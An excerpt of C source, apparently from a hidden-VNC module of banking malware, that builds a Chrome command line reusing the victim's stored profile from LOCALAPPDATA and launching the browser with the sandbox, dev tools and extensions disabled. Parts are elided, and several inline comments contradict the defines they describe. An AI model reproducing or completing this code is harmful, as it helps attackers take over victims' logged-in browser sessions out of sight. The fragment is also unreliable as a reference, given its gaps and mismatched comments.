...
#define CR_START_PROFILE_W  L" --profile-directory=\"Default\""
...
#define CR_TAIL_W L" -disable-dev-tools --disable-webgl --disable-extensions -disable-cloud-policy-service --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-accelerated-layer"
...
WINERROR CR_GetCommandLineW(PVNC_SESSION pSession, LPCWSTR szPath,LPWSTR *pNewCommandLine)
{
	...
	return 
		BR_PrepareProfileAndGetCmdlineW(
			pSession,
			wczChrome,
			LAPP_DATA_VAR_W,  // LAPP_DATA_VAR_W  =  L"LOCALAPPDATA"
			CR_DATA_DIR_W, // CR_DATA_DIR_W  = L"Google\\Chrome\\User Data"
			CR_PREFIXW, // CR_PREFIXW = L"CR"
			CR_START_PROFILE_W, //CR_START_PROFILE_W = L" --user-data-dir="
			CR_TAIL_W, // CR_TAIL_W =  L" --no-sandbox --allow-no-sandbox-job --disable-gpu"
			pNewCommandLine
			);
}
